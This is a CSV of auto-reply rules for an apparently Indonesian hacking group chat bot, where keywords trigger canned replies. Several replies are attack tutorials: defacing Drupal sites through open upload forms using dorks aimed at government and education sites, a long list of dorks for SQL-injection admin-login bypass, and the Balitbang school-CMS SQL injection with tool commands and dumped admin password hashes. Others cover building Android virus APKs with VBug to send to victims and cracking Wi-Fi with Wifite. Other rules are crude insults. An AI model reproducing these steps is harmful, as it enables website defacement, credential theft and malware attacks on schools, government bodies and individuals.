"received_message","pattern_matching","reply_message","multiple_replies","multiple_reply_delay","multiple_reply_delay_max","recipients","contacts","ignored_contacts","reply_delay","reply_delay_max","specific_times","monday","tuesday","wednesday","thursday","friday","saturday","sunday","pause_type","pause_value","disabled"
"drupal hidden","none","DEFACE METODE DRUPAL HIDDEN UPLOADER\n\n\n\n\nHallo gaes kali ini gw akan memberikan tutorial deface metodeÂ drupal hidden uploader ok gausah banyak bacot langsung aja ke tutorialnya : V\nBAHAN"" : SCRIPT DEFACE\nÂ  Â  Â  Â  Â  Â  Â  Â  Â  Â  DORK :\n\nAllowed file types: jpg html txt. site:gov\n\nAllowed file types: jpg html txt. site:edu\n\nAllowed file types: png gif jpg txt.\n\nsite:(Domain Negara yg diinginkan)\n\nÂ  Â  Â  Â  Â  Â  Â  Â  Â  Â  KETAMPANAN: V\nÂ  Â  Â  Â  Â  Â  Â  Â  Â \n1. Dorking dulu di google pake dork yang di atas & pilih target:v\n\n2. Kalau vuln muncul tempat upload\n\n\n\n3. Trus klikÂ PILIH FILEÂ & pilih script deface kesayangan kalian :V lalu klikÂ UPLOAD\n\n\n\n4. Nah kan udah ke upload, di samping tulisanÂ REMOVEÂ kan ada nama script deface lu, truss klik dan BOOM langsung keDeface tinggal mirrorin deh:V\n\n\n\n\nSekian dulu tutorialÂ DEFACE METODE DRUPAL HIDDEN UPLOADERÂ Semoga bermanfaat & semoga kalian paham :V","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"#wts","none","Jangan promosi aja anjeng !","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"subs rey","none","https://www.youtube.com/channel/UCDWY5hUhbdhOsufx1cnp2ng\n\nDi subscribe ya hewkwr","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"arti bypass admin","none","Bypass Admin adalah teknik dimana queri sql dipaksa dimasukan pada form login yang nantinya akan dibaca oleh sistem sebagai sebuah queri sql pada umumnya.Â Karena intruksinya memaksa, jadi tanpa user&pass pun sistem akan memprosesnya.Â ","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"apk sandroproxy","none","https://m.apkpure.com/id/sandroproxy/org.sandroproxy/download?from=details\n\nKlik anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"*","similar","Hai member grup kali ini kita untuk belajar menggunakan fitur bot (balasan otomatis) ketik menu untuk memulai bot.","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"apa itu termux","none","Termux adalah salah satu aplikasi android terminal emulator dan linux environtment yang dapat di gunakan tanpa root dan juga root.\n\nAda banyak kegunaanÂ termux, tentu nya untuk mepermudah user dalam beraktivitas seperti menggunakan bot atau pesan otomatis, bermain game, hacking, seperti : hack situs/website atau biasa disebut juga dengan deface, hack medsos (media sosial), Facebook, Instagram, WhatsApp, hack cctv, hack Video Tron/Layar papan reklame jalan, mengendalikan Laptop/PC, hp, gadget, android/Smartphone orang lain baik jarak dekat maupun jarak jauh, membuat dan mengirimkan virus /Virtex yang dapat membuat hp, gadget, android/Smartphone sih penerima menjadi lambat-loading, lemot, lelet, dan WhatsAppnya keluar sendiri atau eror, membuat dan mengirimkan Spam mulai dari spam telfon, pesan : sms, chat, ngerjain teman dan lain sebagainya.\n\nJika kalian belum mempunyai aplikasi termux, Silahkan Klik-Link dibawah ini untuk mendownload aplikasi Termux :\nhttps://play.google.com/store/apps/details?id=com.termux\n\nPertama - tama kalian harus menginstall dan menjalankanÂ commands/Perintah yang pentingÂ di bawah ini, agar semua tools dapat berjalan denganÂ lancarÂ dan up to date, dan juga silahkan ikuti trik nya.\n\n*Trik Termux* â“‰â“”â“‚â“â“\n\nUntuk mematikan atau memberhentikan tools tekan tombolÂ volume bawah (-) + CÂ secara bersamaan.\n\nUntuk memunculkan commands/perintah sebelumnya tekan tombolÂ volume bawah + P.\n\nMenampilkan Tombol *ESC, HOME, CTRL dan lainnya* Tekan TombolÂ volume atas + Q.\n\nKetik *clear* Untuk Membersihkan tampilan layar.\n\nKetik *exit* untuk keluar dari aplikasi Termux.\n\nKetik *cp* Untuk mengcopy suatu file.\n\nKetik *history* Untuk mengetahui perintah-perintah yang sudah digunakan sebelumnya.\n\n*Keterangan :*\n\n- *apt* dan *pkg* fungsinya sama, yang membedakan hanya tulisan, huruf dan bacaannya.\n\n- *&&* : untuk menggabungkan 2 perintah command-Termux.\n\n- *-y* : untuk melanjutkan penginstalan tools tanpa harus mengetik *y ( y/n ) yes or no*, dalam bahasa Indonesia : *ya atau tidak*.\n\n*Tanpa Root*\n\n*Memperbarui dan Meningkatkan Termux*\n$ pkg update && pkg upgrade\n\n*Tools pendukung yang di perlukan agar tools yang lain work. <----<* _PENTING_\n$ pkg install git php curl -y\n$ pkg install python2\n$ pkg install apache2\n\n*CatatanÂ :* Jika ada pertanyaan saat install, silahkan ketik tombol y lalu enter saja, agar proses install dapat berjalan dengan lancar.\n\n*Menampilkan Matrix*\nIni cuma menampilkan *angka dan huruf* berjatuhan, terlihatÂ keren.\n$ pkg install cmatrix\n$ cmatrix\n\n*Memunculkan gambar Kereta Api yang bergerak*\n$ pkg install sl\n$ sl\n\n*Bermain game*\n$ pkg install moon-buggy\n$ moon-buggy\n\n*Menampilkan Informasi System*\n$ pkg install neofetch\n$ neofetch\n_Untuk melihat Informasi memory_\n$ free\n\n*Membuat Tulisan atau Teks Besar di Terminal*\n$ pkg install figlet\n$ figlet TeMan \n$ ( nama kalian )\n\n*Menampilkan kalender*\n$ cal\n*atau*\n$ cal 2019 \n*Catatan:* jika kalian ingin melihat kalender tahun berikutnya atau sebelumnya kalian hanya tinggal mengubah tahunnya )\n*Untuk menampilkan jam bulan tahun*\n$ date\n\n*Menjalankan Musik di Termux*\n$ pkg install mpv\n$ mpv /lokasi/musik/musik.mp3\n\n*Cara mempercepat koneksi Internet*\n_Ketik perintah berikut ini, untuk mengetahui ip kalian_\n$ ifconfig\n_Setelah itu, akan muncul ip kalian, Silahkan salin IP kalian tersebut dengan menggunakan perintah di bawah ini._\n$ ping -s ipkalian\n\n_atau langsung saja ketik/salin command/perintah dibawah ini :_\n$ ping 8.8.8.8\n\nCara Mempercantik Tampilan Termux\n$ pkg update && pkg upgrade\n$ pkg install ruby cowsay toilet figlet\n$ pkg install neofetch\n$ gem install lolcat\n$ cd ../usr/etc\n$ nano bash.bashrc\n_Kalian tinggal menyalin kode berikut ini lalu menempelkannya :_\n\ncowsay -f eyes ""Nama"" | lolcat\ntoilet -f standard ""Nama"" -F gay\nneofetch\ndate | lolcat\n\nKemudian tekan *Volume bawah + X lalu ""y""* atau jika ada *CTRL* kalian bisa juga *CTRL + X lalu ""y""* dan *Enter*.Lalu coba kalian buka sesi baru dan hiasannya pun akan muncul.\n\n*Root ( Rooting )*\n\n*Untuk masuk mode root (Bila hp sudah di root)*\n$ apt install su\n$ su\n\n*Cara Install Wifite di Termux Android*\nWifiteÂ adalah salah satu tool yang berfungsi untuk wireless attack, seperti mengcrack atau membobol password wifi yang terkunci dengan wpa/wpa2.\n\n*Cara Install Wifite*\n$ git clone https://github.com/derv82/wifite\n$ cd wifite\n$ chmod 777 wifite.py\n\n*Cara Menjalankan Wifite*\n$ python2 wifite.py\n*atau*\n*Cara hack WiFi, hp harus di root terlebih dahulu*\n- Download aplikasi WiFi kill\n\n*Cara Membuat Virus Di Termux*\nInstall Python dan Git, dengan menggunakan perintah :\n$ pkg install python && pkg install git\n\nSelanjutnya yang terakhir, mari kita klon atau download script Vbug, dengan menggunakan perintah :\n$ git cloneÂ https://github.com/Junior60/vbug\n\n- Selanjutnya masuk kedalam direktori VBug, dengan menggunakan perintah :\n$ cd vbug\n\nSelanjutnya, jalankan tools VBug, dengan menggunakan perintah :_\n$ python2 vbug.py\n\n- Jika sudah muncul gambar, silahkan kalian enter.\n- Selanjutnya, kalian akan disuguhi 3 pilihan, yaitu Virus Android, Windows atau MacOS, pilih salah satu, disini saya akan membuat Virus Android yaitu memilih angka nomor 1, dengan menggunakan perintah :\n$ 1 lalu enter\n\n- Setelah itu, kalian akan disuguhi kembali pilihan Virus, silahkan kalian pilih salah satu, pilih sesuai huruf depan Virus, contoh Bootloop, berarti jika kalian ingin memilih Virus Android tersebut kalian tinggal mengetik huruf depannya yaitu : \n$ B lalu enter.\n\n- Selanjutnya, jika kalian ingin mengirim Virus tersebut, silahkan kalian pindahkan virus tersebut ke Penyimpanan Internal kalian, dengan menggunakan perintah :\n$ mv namavirus.apk /sdcard\n\n*Catatan :* Nama Virus Ada Saat Proses Pembuat Virus Menggunakan VBug.\n\n- Jika munvul ""permission denied"" silahkan izinkan Termux mengakses Penyimapanan Internal kalian, dengan menggunakan perintahÂ :\n$ termux-setup-storage\n\n- Kalian tinggal mengirimkan Virus Android tersebut, ke target kalian dan suruh lah install virus tersebut lalu membukanya, maka virus tersebut akan berjalan.","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"halo","similar","halo %name%","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"woi bot","none","_Ya ada apa?_<#>Butuh bantuan<#>Ketik *menu* untuk menampilkan semua keyword yang tersedia âœ“","all","","","b","","","","","0","","","","","","","","seconds","0","0"
"wa gb","none","http://www.mediafire.com/file/kxfz7d4u3w6vdcm/GBWA.8.45F_By_FouadMODS.apk/file\n\nKlik anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"heker","similar","STIKER MULU AJG","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"dork bypass admin","none","DORK BYPASS ADMIN SAKTI GAN :v inurl:/administrator/login.php inurl:/admin/index.php intext:username inurl:/administrator/login.php intext:username inurl:/admin/main.php intext:username inurl:/admin/login.html intext:login inurl:/administrator/index.php intext:login inurl:/adminweb/ intext:login.php ""inurl:admin.php"" ""inurl:admin/login.php"" ""inurl:adminlogin.php"" ""inurl:adminhome.php"" ""inurl:admin_login.php"" ""inurl:administratorlogin.php"" ""inurl:/Manager/index.php ""inurl:login/administrator.php"" ""inurl:administrator_login.php ""inurl:admin/addproduct.asp"" ""inurl:admin/user.asp"" ""inurl:admin/ addpage.php"" ""inurl:admin/ gallery.asp"" ""inurl:admin/image.asp"" ""inurl:admin/adminuser.asp"" ""inurl:admin/productadd.asp"" ""inurl:admin/addadmin.asp"" ""inurl:admin/add_admin.asp"" ""inurl:admin/add_admin.php"" ""inurl:admin/addnews.asp"" ""inurl:admin/addpost"" ""inurl:admin/addforum.???"" ""inurl:admin/addgame.???"" ""inurl:admin/addblog.????"" ""inurl:admin/admin_detail.php"" ""inurl:admin/admin_area.php"" ""inurl:admin/product_add.php"" ""inurl:admin/additem.php"" ""inurl:admin/addstore.php"" ""inurl:admin/add_Products.???"" ""inurl:admin/showbook.???"" ""inurl:admin/selectitem.???"" ""allinurl:admin/addfile.???"" ""inurl:admin/addarticle.asp"" ""inurl:admin/addfile.asp"" ""inurl:admin/upload.php"" ""inurl:admin/upload.asp"" ""inurl:admin/addstory.php"" ""inurl:admin/addshow.php"" ""inurl:admin/addmember.asp"" ""inurl:admin/addinfo.asp"" ""inurl:admin/addcat.asp"" ""inurl:admin/cp.asp"" ""inurl:admin/ productshow.asp"" ""inurl:admin/ addjob.asp"" ""inurl:admin/addjob.???"" ""inurl:admin/addpic.???"" ""inurl:admin/viewproduct.???"" ""inurl:admin/addaccount.php"" ""inurl:admin/manage.php"" ""inurl:admin/addcontact.???"" ""inurl:admin/viewmanager.???"" ""inurl:admin/addschool.???"" ""inurl:admin/addproject.???"" ""inurl:admin/addsale.???"" ""inurl:admin/addcompany.???"" ""inurl:admin/payment.???"" ""inurl:user/emp.???"" ""inurl:admin/ addmovie.???"" ""inurl:admin/ addpassword.???"" ""inurl:admin/ addemployee.???"" ""inurl:admin/ addcat.???"" ""inurl:admin/admin.???"" ""inurl:admin/admincp.???"" ""inurl:admin/settings.???"" ""inurl:admin/addstate.???"" ""inurl:admin/addcountry.???"" ""inurl:admin/addmedia.???"" ""inurl:admin/addcode.???"" ""inurl:admin/addlinks.???"" ""inurl:admin/addcity.???"" ""inurl:admin/login.asp"" ""inurl:adminlogin.asp"" ""inurl:adminhome.asp"" ""inurl:admin_login.asp"" ""inurl:administratorlogin.asp"" ""inurl:login/administrator.asp"" ""inurl:administrator_login.asp inurl:/admin/index.php?id=? inurl:/admin/index.php?r=site/login Dork bypas admin 3 ""inurl:admin/addproduct.asp"" ""inurl:admin/user.asp"" ""inurl:admin/addpage.php"" ""inurl:admin/gallery.asp"" ""inurl:admin/image.asp"" ""inurl:admin/adminuser.asp"" ""inurl:admin/productadd.asp"" ""inurl:admin/addadmin.asp"" ""inurl:admin/add_admin.asp"" ""inurl:admin/add_admin.php"" ""inurl:admin/addnews.asp"" ""inurl:admin/addpost"" inurl""inurl:admin/addforum.???"" ""inurl:admin/addgame.???"" ""inurl:admin/addblog.????"" ""inurl:admin/admin_detail.php"" ""inurl:admin/admin_area.php"" ""inurl:admin/product_add.php"" ""inurl:admin/additem.php"" ""inurl:admin/addstore.php"" ""inurl:admin/add_Products.???"" ""inurl:admin/showbook.???"" ""inurl:admin/selectitem.???"" ""allinurl:admin/addfile.???"" ""inurl:admin/addarticle.asp"" ""inurl:admin/addfile.asp"" ""inurl:admin/upload.php"" ""inurl:admin/upload.asp"" ""inurl:admin/addstory.php"" ""inurl:admin/addshow.php"" ""inurl:admin/addmember.asp"" ""inurl:admin/addinfo.asp"" ""inurl:admin/addcat.asp"" ""inurl:admin/cp.asp"" ""inurl:admin/productshow.asp"" ""inurl:admin/addjob.asp"" ""inurl:admin/addjob.???"" ""inurl:admin/addpic.???"" ""inurl:admin/viewproduct.???"" ""inurl:admin/addaccount.php"" ""inurl:admin/manage.php"" ""inurl:admin/addcontact.???"" ""inurl:admin/viewmanager.???"" ""inurl:admin/addschool.???"" ""inurl:admin/addproject.???"" ""inurl:admin/addsale.???"" ""inurl:admin/addcompany.???"" ""inurl:admin/payment.???"" ""inurl:user/emp.???"" ""inurl:admin/addmovie.???"" ""inurl:admin/addpassword.???"" ""inurl:admin/addemployee.???"" ""inurl:admin/addcat.???"" ""inurl:admin/admin.???"" ""inurl:admin/admincp.???"" ""inurl:admin/settings.???"" ""inurl:admin/addstate.???"" ""inurl:admin/addcountry.???"" ""inurl:admin/addmedia.???"" ""inurl:admin/addcode.???"" ""inurl:admin/addlinks.???"" ""inurl:admin/addcity.???""","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"assalamualaikum","none","Waalakumsallam","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"menu","none","maintenance","single","","","g","","","","","0","","","","","","","","seconds","0","1"
"sql balitbang","none","cara\n devace web sekolah menggunakan metode Balitbang.. kalian yg punya dendam, benci atau apalah ke sekolah kalian mngkin bisa bisa pke cara ini:V"".. balitbang sendiri ada bnyk ada yg register 3.5.3.. tpi kalaw gw sih pke tools punya nya master gw afrizal:V"".. lngsng aja tutorialnya :\n\n\n1. Termux (download diplaystore)\n\n2. Sc&Shell Backdoor\n\n3. Dork :Â \n\n>intext:""Setup by Website Sekolah Gratis."" Ulangan Site:sch.id\n\ninurl:/member/daftar.php\n>intext:""Setup by cmssekolahku."" cbt site:sch.id\n\n>intext:""Setup by Website Sekolah Gratis."" rudi site:sch.id\n\n>intext:""Setup by Website Sekolah Gratis."" guru bahasa site:sch.id\n\n>intext:""Setup by Website Sekolah Gratis."" firman site:sch.id\n\n>intext:""Setup by Website Sekolah Gratis."" kenaikan kelas Site:sch.id\n(Kembangin ea biar dpet bnyk)\n\n4. Toolsnya :\nhttps://github.com/Afrizall/balitbang-sqli-post-data/blob/master/balitbang.php\n\n5. Exploit ; http://web.nya/member/listmemberall.php\n\nLangkah awal dorking digoogle kek biasanyaa .. Btw gw sih suka deface web pemerintah ketimbang web sekolah:V""..\n\n\nPilih salah satu target web sekolah yg mau dideface.. kemudian masukan exploitnya /listmemberall.php kalaw vuln blank putih..\n\n\n\n\nKalaw sudah nemu target buka termux dan install dulu toolsnya.. caranya?Â \n\n$git clone https//github.com/Afrizall/balitbang-sqli-post-data/blob/master/balitbang.phpÂ \n\n\nKemudianÂ \n\n$cdÂ balitbang-sqli-post-data\n\nLast\n$php balitbang.php targetkalian\n\n\n\n[+] Data 1 [+]\n\n[+] Username : admin\n\n[+] Password : 5bg848383c1c6c7c4b3c0\n\n[+] End Data [+]\n\n\n[+] Data 2 [+]\n\n[+] Username : gafar\n\n[+] Password : 5bg848383b3bbb9c0b3c5\n\n[+] End Data [+]\n\n\nLah done kan.. terakhir tingggal kita hash passwordnya yg data1.. hashnya private ea bang..","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"bot tolol","similar","Kau yang tolol anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"bot kontol","similar","Kau yang kontol anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"bot anjeng","similar","Kau yang anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
